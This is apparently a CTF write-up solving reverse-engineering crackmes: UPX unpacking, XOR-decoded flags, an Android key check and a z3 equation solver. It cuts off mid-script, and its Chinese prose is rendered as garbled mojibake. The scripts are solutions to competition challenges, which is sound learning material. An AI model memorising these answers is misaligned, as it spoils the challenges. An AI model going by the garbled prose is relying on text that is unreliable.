<p>æŠŠç´¢å¼•è¡¨å¤åˆ¶è¿›å»è§£å¯†æ‹¿åˆ°flag</p>
<h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX!"></a>UPX!</h2><p>exeinfopeä¸­çœ‹åˆ°æ˜¯upx 3.9 è„±å£³å</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = j;</span><br><span class="line">    v2 = sub_140073829((__int64)inputString);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt;= v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    inputString[j] ^= <span class="number">0x67</span>u;</span><br><span class="line">    <span class="keyword">if</span> ( flag[j] != inputString[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_140073973((__int64)<span class="string">&quot;try again~~&quot;</span>);</span><br><span class="line">      sub_1400723F7(<span class="number">0</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œå¯ä»¥å¾—å‡ºåªéœ€è¦å°†flagå…¨éƒ¨æ•°æ®å¼‚æˆ–ä¸Š0x67uè½¬asciiç å°±èƒ½æ‹¿åˆ°flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = [</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x13</span>, <span class="number">0x01</span>, <span class="number">0x1C</span>, <span class="number">0x57</span>, <span class="number">0x0F</span>, <span class="number">0x38</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x57</span>, <span class="number">0x12</span>, <span class="number">0x38</span>, <span class="number">0x2C</span>, <span class="number">0x09</span>, <span class="number">0x57</span>, <span class="number">0x10</span>, <span class="number">0x38</span>, <span class="number">0x2F</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x10</span>, <span class="number">0x38</span>, <span class="number">0x13</span>, <span class="number">0x08</span>, <span class="number">0x38</span>, <span class="number">0x35</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x54</span>,</span><br><span class="line">    <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x38</span>, <span class="number">0x32</span>, <span class="number">0x37</span>, <span class="number">0x3F</span></span><br><span class="line">] + [<span class="number">0x46</span>, <span class="number">0x46</span>, <span class="number">0x46</span>] + [<span class="number">0x1A</span>] + [<span class="number">0x00</span>] * <span class="number">0x17</span></span><br><span class="line"></span><br><span class="line">xor_result = [byte ^ <span class="number">0x67</span> <span class="keyword">for</span> byte <span class="keyword">in</span> data]</span><br><span class="line">ascii_output = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> xor_result])</span><br><span class="line"><span class="built_in">print</span>(ascii_output)</span><br></pre></td></tr></table></figure>



<h2 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data = [ <span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x5C</span>,<span class="number">0x5A</span>,<span class="number">0x4D</span>,<span class="number">0x5F</span>,<span class="number">0x42</span>,</span><br><span class="line">         <span class="number">0x60</span>,<span class="number">0x56</span>,<span class="number">0x4C</span>,<span class="number">0x66</span>,<span class="number">0x52</span>,<span class="number">0x57</span>,<span class="number">0x9</span>,<span class="number">0x4E</span>,<span class="number">0x66</span>,<span class="number">0x51</span>,</span><br><span class="line">         <span class="number">0x9</span>,<span class="number">0x4E</span>,<span class="number">0x66</span>,<span class="number">0x4D</span>,<span class="number">0x9</span></span><br><span class="line">    ,<span class="number">0x66</span>,<span class="number">0x61</span>,<span class="number">0x9</span>,<span class="number">0x6B</span>,<span class="number">0x18</span>,<span class="number">0x44</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">xor_result = [byte ^ <span class="number">0x39</span> <span class="keyword">for</span> byte <span class="keyword">in</span> data]</span><br><span class="line">ascii_output = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> xor_result])</span><br><span class="line"><span class="built_in">print</span>(ascii_output)</span><br></pre></td></tr></table></figure>



<h2 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h2><p>æ ¹æ®hint1 æœç´¢åˆ°buttonçš„id</p>
<p>æœåˆ°r.id.checkæ‰¾åˆ°å…³é”®ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] enc = &#123;<span class="number">25</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="string">&#x27;/&#x27;</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="number">11</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">28</span>, <span class="number">21</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">16</span>&#125;;</span><br><span class="line">    <span class="type">char</span>[] key = &#123;<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;y&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText) findViewById(R.id.input);</span><br><span class="line">        ((Button) findViewById(R.id.check)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.doctor3.basicandroid.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> editText.getText().toString();</span><br><span class="line">                <span class="keyword">if</span> (obj.length() != <span class="number">31</span>) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;é•¿åº¦ä¸å¯¹å“¦&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">byte</span>[] bytes = obj.getBytes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((bytes[i] ^ MainActivity.<span class="built_in">this</span>.key[i % MainActivity.<span class="built_in">this</span>.key.length]) != MainActivity.<span class="built_in">this</span>.enc[i]) &#123;</span><br><span class="line">                        Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;å¥½åƒæœ‰å“ªé‡Œä¸å¯¹&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;æ­å–œï¼å›ç­”æ­£ç¡®&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((bytes[i] ^ MainActivity.this.key[i % MainActivity.this.key.length]) != MainActivity.this.enc[i])</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±å¯ä»¥å¾—å‡ºåªè¦å°†enc ^ MainActivity.this.key[i % MainActivity.this.key.length])å°±å¯ä»¥å¾—åˆ°bytes ä¸Šé¢å¾—çŸ¥bytesçš„é•¿åº¦ä¸º31</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">25</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="string">&#x27;/&#x27;</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">4</span>,</span><br><span class="line">       <span class="number">1</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="number">11</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="number">24</span>,</span><br><span class="line">       <span class="string">&#x27;:&#x27;</span>, <span class="number">28</span>, <span class="number">21</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;y&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(enc[i], <span class="built_in">int</span>):</span><br><span class="line">        enc[i] = enc[i] ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        enc[i] = <span class="built_in">ord</span>(enc[i]) ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(enc[i]), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="EQUATION"><a href="#EQUATION" class="headerlink" title="EQUATION"></a>EQUATION</h2><p>ä½¿è¿ç®—å…¨éƒ¨ä¸ºå‡å°±è¡Œäº† æŠŠ!&#x3D;æ”¹æˆ&#x3D;&#x3D; ç„¶åä¸¢z3é‡Œé¢è·‘ï¼Œscanfæ˜¯31sï¼Œä½†æ˜¯idaæ˜¾ç¤ºä¸Šæ˜¯æœ€å¤§ä¸º24ï¼Œéœ€è¦ä¿®æ”¹ä¸€ä¸‹é•¿åº¦</p>
<p>å¤šè¡Œåˆå¹¶ä¸€è¡Œ<a target="_blank" rel="noopener" href="https://www.lddgo.net/string/line-reduce">https://www.lddgo.net/string/line-reduce</a></p>
<p>ä¸€è¡ŒæŒ‰åˆ†éš”ç¬¦åˆ†å¤šè¡Œ<a target="_blank" rel="noopener" href="https://www.toolhelper.cn/Char/TextSplit">https://www.toolhelper.cn/Char/TextSplit</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">v4 = [Int(<span class="string">f&#x27;v4[<span class="subst">&#123;i&#125;</span>]&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(32):</span></span><br><span class="line"><span class="comment">#     s.add(v4[i] != 0)</span></span><br><span class="line"><span class="comment">#     s.add(v4[i] &gt;= 32)</span></span><br><span class="line"><span class="comment">#     s.add(v4[i] &lt;= 126)</span></span><br><span class="line"></span><br><span class="line">s.add(v4[<span class="number">0</span>] == <span class="number">109</span>) <span class="comment">#m</span></span><br><span class="line">s.add(v4[<span class="number">1</span>] == <span class="number">111</span>) <span class="comment">#o</span></span><br><span class="line">s.add(v4[<span class="number">2</span>] == <span class="number">101</span>) <span class="comment">#e</span></span><br><span class="line">s.add(v4[<span class="number">3</span>] == <span class="number">99</span>)  <span class="comment">#c</span></span><br><span class="line">s.add(v4[<span class="number">4</span>] == <span class="number">116</span>) <span class="comment">#t</span></span><br><span class="line">s.add(v4[<span class="number">5</span>] == <span class="number">102</span>) <span class="comment">#f</span></span><br><span class="line">s.add(v4[<span class="number">6</span>] == <span class="number">123</span>) <span class="comment">#&#123;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">s.add(<span class="number">334</span> * v4[<span class="number">28</span>]+ <span class="number">100</span> * v4[<span class="number">27</span>]+ <span class="number">369</span> * v4[<span class="number">26</span>]+ <span class="number">124</span> * v4[<span class="number">25</span>]+ <span class="number">278</span> * v4[<span class="number">24</span>]+ <span class="number">158</span> * v4[<span class="number">23</span>]+ <span class="number">162</span> * v4[<span class="number">22</span>]+ <span class="number">145</span> * v4[<span class="number">19</span>]+ <span class="number">27</span> * v4[<span class="number">17</span>]+ <span class="number">91</span> * v4[<span class="number">15</span>]+ <span class="number">195</span> * v4[<span class="number">14</span>]+ <span class="number">342</span> * v4[<span class="number">13</span>]+ <span class="number">391</span> * v4[<span class="number">10</span>]+ <span class="number">204</span> * v4[<span class="number">9</span>]+ <span class="number">302</span> * v4[<span class="number">8</span>]+ <span class="number">153</span> * v4[<span class="number">7</span>]+ <span class="number">292</span> * v4[<span class="number">6</span>]+ <span class="number">382</span> * v4[<span class="number">5</span>]+ <span class="number">221</span> * v4[<span class="number">4</span>]+ <span class="number">316</span> * v4[<span class="number">3</span>]+ <span class="number">118</span> * v4[<span class="number">2</span>]+ <span class="number">295</span> * v4[<span class="number">1</span>]+ <span class="number">247</span> * v4[<span class="number">0</span>]+ <span class="number">236</span> * v4[<span class="number">11</span>]+ <span class="number">27</span> * v4[<span class="number">12</span>]+ <span class="number">361</span> * v4[<span class="number">16</span>]+ <span class="number">81</span> * v4[<span class="number">18</span>]+ <span class="number">105</span> * v4[<span class="number">20</span>]+ <span class="number">65</span> * v4[<span class="number">21</span>]+ <span class="number">67</span> * v4[<span class="number">29</span>]+ <span class="number">41</span> * v4[<span class="number">30</span>] == <span class="number">596119</span>)</span><br><span class="line">s.add(<span class="number">371</span> * v4[<span class="number">29</span>]+ <span class="number">338</span> * v4[<span class="number">28</span>]+ <span class="number">269</span> * v4[<span class="number">27</span>]+ <span class="number">312</span> * v4[<span class="number">26</span>]+ <span class="number">67</span> * v4[<span class="number">25</span>]+ <span class="number">299</span> * v4[<span class="number">24</span>]+ <span class="number">235</span> * v4[<span class="number">23</span>]+ <span class="number">294</span> * v4[<span class="number">22</span>]+ <span class="number">303</span> * v4[<span class="number">21</span>]+ <span class="number">211</span> * v4[<span class="number">20</span>]+ <span class="number">122</span> * v4[<span class="number">19</span>]+ <span class="number">333</span> * v4[<span class="number">18</span>]+ <span class="number">341</span> * v4[<span class="number">15</span>]+ <span class="number">111</span> * v4[<span class="number">14</span>]+ <span class="number">253</span> * v4[<span class="number">13</span>]+ <span class="number">68</span> * v4[<span class="number">12</span>]+ <span class="number">347</span> * v4[<span class="number">11</span>]+ <span class="number">44</span> * v4[<span class="number">10</span>]+ <span class="number">262</span> * v4[<span class="number">9</span>]+ <span class="number">357</span> * v4[<span class="number">8</span>]+ <span class="number">323</span> * v4[<span class="number">5</span>]+ <span class="number">141</span> * v4[<span class="number">4</span>]+ <span class="number">329</span> * v4[<span class="number">3</span>]+ <span class="number">378</span> * v4[<span class="number">2</span>]+ <span class="number">316</span> * v4[<span class="number">1</span>]+ <span class="number">235</span> * v4[<span class="number">0</span>]+ <span class="number">59</span> * v4[<span class="number">6</span>]+ <span class="number">37</span> * v4[<span class="number">7</span>]+ <span class="number">264</span> * v4[<span class="number">16</span>]+ <span class="number">73</span> * v4[<span class="number">17</span>]+ <span class="number">126</span> * v4[<span class="number">30</span>] == <span class="number">634009</span>)</span><br><span class="line">s.add(<span class="number">337</span> * v4[<span class="number">29</span>]+ <span class="number">338</span> * v4[<span class="number">28</span>]+ <span class="number">118</span> * v4[<span class="number">27</span>]+ <span class="number">82</span> * v4[<span class="number">26</span>]+ <span class="number">239</span> * v4[<span class="number">21</span>]+ <span class="number">58</span> * v4[<span class="number">20</span>]+ <span class="number">304</span> * v4[<span class="number">19</span>]+ <span class="number">330</span> * v4[<span class="number">18</span>]+ <span class="number">377</span> * v4[<span class="number">17</span>]+ <span class="number">306</span> * v4[<span class="number">16</span>]+ <span class="number">221</span> * v4[<span class="number">13</span>]+ <span class="number">345</span> * v4[<span class="number">12</span>]+ <span class="number">124</span> * v4[<span class="number">11</span>]+ <span class="number">272</span> * v4[<span class="number">10</span>]+ <span class="number">270</span> * v4[<span class="number">9</span>]+ <span class="number">229</span> * v4[<span class="number">8</span>]+ <span class="number">377</span> * v4[<span class="number">7</span>]+ <span class="number">373</span> * v4[<span class="number">6</span>]+ <span class="number">297</span> * v4[<span class="number">5</span>]+ <span class="number">112</span> * v4[<span class="number">4</span>]+ <span class="number">386</span> * v4[<span class="number">3</span>]+ <span class="number">90</span> * v4[<span class="number">2</span>]+ <span class="number">361</span> * v4[<span class="number">1</span>]+ <span class="number">236</span> * v4[<span class="number">0</span>]+ <span class="number">386</span> * v4[<span class="number">14</span>]+ <span class="number">73</span> * v4[<span class="number">15</span>]+ <span class="number">315</span> * v4[<span class="number">22</span>]+ <span class="number">33</span> * v4[<span class="number">23</span>]+ <span class="number">141</span> * v4[<span class="number">24</span>]+ <span class="number">129</span> * v4[<span class="number">25</span>]+ <span class="number">123</span> * v4[<span class="number">30</span>] == <span class="number">685705</span>)</span><br><span class="line">s.add(<span class="number">367</span> * v4[<span class="number">29</span>]+ <span class="number">55</span> * v4[<span class="number">28</span>]+ <span class="number">374</span> * v4[<span class="number">27</span>]+ <span class="number">150</span> * v4[<span class="number">24</span>]+ <span class="number">350</span> * v4[<span class="number">23</span>]+ <span class="number">141</span> * v4[<span class="number">22</span>]+ <span class="number">124</span> * v4[<span class="number">21</span>]+ <span class="number">366</span> * v4[<span class="number">20</span>]+ <span class="number">230</span> * v4[<span class="number">19</span>]+ <span class="number">307</span> * v4[<span class="number">18</span>]+ <span class="number">191</span> * v4[<span class="number">17</span>]+ <span class="number">153</span> * v4[<span class="number">12</span>]+ <span class="number">383</span> * v4[<span class="number">11</span>]+ <span class="number">145</span> * v4[<span class="number">10</span>]+ <span class="number">109</span> * v4[<span class="number">9</span>]+ <span class="number">209</span> * v4[<span class="number">8</span>]+ <span class="number">158</span> * v4[<span class="number">7</span>]+ <span class="number">221</span> * v4[<span class="number">6</span>]+ <span class="number">188</span> * v4[<span class="number">5</span>]+ <span class="number">22</span> * v4[<span class="number">4</span>]+ <span class="number">146</span> * v4[<span class="number">3</span>]+ <span class="number">306</span> * v4[<span class="number">2</span>]+ <span class="number">230</span> * v4[<span class="number">1</span>]+ <span class="number">13</span> * v4[<span class="number">0</span>]+ <span class="number">287</span> * v4[<span class="number">13</span>]+ <span class="number">257</span> * v4[<span class="number">14</span>]+ <span class="number">137</span> * v4[<span class="number">15</span>]+ <span class="number">7</span> * v4[<span class="number">16</span>]+ <span class="number">52</span> * v4[<span class="number">25</span>]+ <span class="number">31</span> * v4[<span class="number">26</span>]+ <span class="number">355</span> * v4[<span class="number">30</span>] == <span class="number">557696</span>)</span><br><span class="line">s.add(<span class="number">100</span> * v4[<span class="number">29</span>]+ <span class="number">191</span> * v4[<span class="number">28</span>]+ <span class="number">362</span> * v4[<span class="number">27</span>]+ <span class="number">55</span> * v4[<span class="number">26</span>]+ <span class="number">210</span> * v4[<span class="number">25</span>]+ <span class="number">359</span> * v4[<span class="number">24</span>]+ <span class="number">348</span> * v4[<span class="number">21</span>]+ <span class="number">83</span> * v4[<span class="number">20</span>]+ <span class="number">395</span> * v4[<span class="number">19</span>]+ <span class="number">350</span> * v4[<span class="number">16</span>]+ <span class="number">291</span> * v4[<span class="number">15</span>]+ <span class="number">220</span> * v4[<span class="number">12</span>]+ <span class="number">196</span> * v4[<span class="number">11</span>]+ <span class="number">399</span> * v4[<span class="number">8</span>]+ <span class="number">68</span> * v4[<span class="number">7</span>]+ <span class="number">84</span> * v4[<span class="number">6</span>]+ <span class="number">281</span> * v4[<span class="number">5</span>]+ <span class="number">334</span> * v4[<span class="number">4</span>]+ <span class="number">53</span> * v4[<span class="number">3</span>]+ <span class="number">399</span> * v4[<span class="number">2</span>]+ <span class="number">338</span> * v4[<span class="number">0</span>]+ <span class="number">18</span> * v4[<span class="number">1</span>]+ <span class="number">148</span> * v4[<span class="number">9</span>]+ <span class="number">21</span> * v4[<span class="number">10</span>]+ <span class="number">174</span> * v4[<span class="number">13</span>]+ <span class="number">36</span> * v4[<span class="number">14</span>]+ <span class="number">2</span> * v4[<span class="number">17</span>]+ <span class="number">41</span> * v4[<span class="number">18</span>]+ <span class="number">137</span> * v4[<span class="number">22</span>]+ <span class="number">24</span> * v4[<span class="number">23</span>]+ <span class="number">368</span> * v4[<span class="number">30</span>] == <span class="number">538535</span>)</span><br><span class="line">s.add(<span class="number">188</span> * v4[<span class="number">29</span>]+ (v4[<span class="number">26</span>] * <span class="number">2</span> ** <span class="number">7</span>)+ <span class="number">93</span> * v4[<span class="number">25</span>]+ <span class="number">248</span> * v4[<span class="number">24</span>]+ <span class="number">83</span> * v4[<span class="number">23</span>]+ <span class="number">207</span> * v4[<span class="number">22</span>]+ <span class="number">217</span> * v4[<span class="number">19</span>]+ <span class="number">309</span> * v4[<span class="number">16</span>]+ <span class="number">16</span> * v4[<span class="number">15</span>]+ <span class="number">135</span> * v4[<span class="number">14</span>]+ <span class="number">251</span> * v4[<span class="number">13</span>]+ <span class="number">200</span> * v4[<span class="number">12</span>]+ <span class="number">49</span> * v4[<span class="number">11</span>]+ <span class="number">119</span> * v4[<span class="number">10</span>]+ <span class="number">356</span> * v4[<span class="number">9</span>]+ <span class="number">398</span> * v4[<span class="number">8</span>]+ <span class="number">303</span> * v4[<span class="number">7</span>]+ <span class="number">224</span> * v4[<span class="number">6</span>]+ <span class="number">208</span> * v4[<span class="number">5</span>]+ <span class="number">244</span> * v4[<span class="number">4</span>]+ <span class="number">209</span> * v4[<span class="number">3</span>]+ <span class="number">189</span> * v4[<span class="number">2</span>]+ <span class="number">302</span> * v4[<span class="number">1</span>]+ <span class="number">395</span> * v4[<span class="number">0</span>]+ <span class="number">314</span> * v4[<span class="number">17</span>]+ <span class="number">13</span> * v4[<span class="number">18</span>]+ <span class="number">310</span> * v4[<span class="number">20</span>]+ <span class="number">21</span> * v4[<span class="number">21</span>]+ <span class="number">67</span> * v4[<span class="number">27</span>]+ <span class="number">127</span> * v4[<span class="number">28</span>]+ <span class="number">100</span> * v4[<span class="number">30</span>] == <span class="number">580384</span>)</span><br><span class="line">s.add(<span class="number">293</span> * v4[<span class="number">29</span>]+ <span class="number">343</span> * v4[<span class="number">28</span>]+ <span class="number">123</span> * v4[<span class="number">27</span>]+ <span class="number">387</span> * v4[<span class="number">26</span>]+ <span class="number">114</span> * v4[<span class="number">25</span>]+ <span class="number">303</span> * v4[<span class="number">24</span>]+ <span class="number">248</span> * v4[<span class="number">23</span>]+ <span class="number">258</span> * v4[<span class="number">21</span>]+ <span class="number">218</span> * v4[<span class="number">20</span>]+ <span class="number">180</span> * v4[<span class="number">19</span>]+ <span class="number">196</span> * v4[<span class="number">18</span>]+ <span class="number">398</span> * v4[<span class="number">17</span>]+ <span class="number">398</span> * v4[<span class="number">14</span>]+ <span class="number">138</span> * v4[<span class="number">9</span>]+ <span class="number">292</span> * v4[<span class="number">8</span>]+ <span class="number">38</span> * v4[<span class="number">7</span>]+ <span class="number">179</span> * v4[<span class="number">6</span>]+ <span class="number">190</span> * v4[<span class="number">5</span>]+ <span class="number">57</span> * v4[<span class="number">4</span>]+ <span class="number">358</span> * v4[<span class="number">3</span>]+ <span class="number">191</span> * v4[<span class="number">2</span>]+ <span class="number">215</span> * v4[<span class="number">1</span>]+ <span class="number">88</span> * v4[<span class="number">0</span>]+ <span class="number">22</span> * v4[<span class="number">10</span>]+ <span class="number">72</span> * v4[<span class="number">11</span>]+ <span class="number">357</span> * v4[<span class="number">12</span>]+ <span class="number">9</span> * v4[<span class="number">13</span>]+ <span class="number">389</span> * v4[<span class="number">15</span>]+ <span class="number">81</span> * v4[<span class="number">16</span>]+ <span class="number">85</span> * v4[<span class="number">30</span>] == <span class="number">529847</span>)</span><br><span class="line">s.add(<span class="number">311</span> * v4[<span class="number">29</span>]+ <span class="number">202</span> * v4[<span class="number">28</span>]+ <span class="number">234</span> * v4[<span class="number">27</span>]+ <span class="number">272</span> * v4[<span class="number">26</span>]+ <span 